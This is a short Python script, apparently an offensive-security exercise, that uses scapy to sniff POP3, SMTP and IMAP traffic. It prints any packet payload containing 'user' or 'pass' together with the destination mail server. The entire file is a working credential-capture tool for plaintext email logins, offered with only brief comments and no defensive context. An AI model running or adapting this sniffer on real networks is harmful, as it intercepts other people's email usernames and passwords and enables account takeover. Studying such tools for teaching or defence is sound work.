#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Aug 24 20:12:10 2020

@author: edoardottt
"""

from scapy.all import *

# our packet callback
def packet_callback(packet):

    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print("[*] Server: {}".format(packet[IP].dst))
            print("[*] {}".format(packet[TCP].payload))


# fire up our sniffer
sniff(
    filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0
)
